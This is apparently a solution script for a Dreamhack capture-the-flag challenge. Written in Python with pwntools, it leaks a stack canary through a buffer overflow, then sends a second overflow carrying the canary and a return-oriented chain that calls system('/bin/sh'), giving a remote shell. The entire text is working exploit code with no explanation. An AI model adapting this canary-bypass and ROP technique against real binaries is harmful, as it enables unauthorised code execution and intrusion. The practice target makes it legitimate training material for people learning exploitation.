# system() = 0x4005d0, "/bin/sh" = 0x400874, gadget(ret) = 0x400596, gadget(pop rdi; ret) = 0x400853

from pwn import *

p = remote("host3.dreamhack.games", 21863)

context.arch = "amd64"

buf2canary = 0x38
payload = b"A" * buf2canary

p.sendlineafter(b"Buf: ", payload)

p.recvuntil(payload + b"\n");
canary = b"\x00" + p.recvn(7)

payload += canary + b"A" * 8 + p64(0x400596) + p64(0x400853) + p64(0x400874) + p64(0x4005d0)

p.sendlineafter(b"Buf: ", payload)

p.interactive()
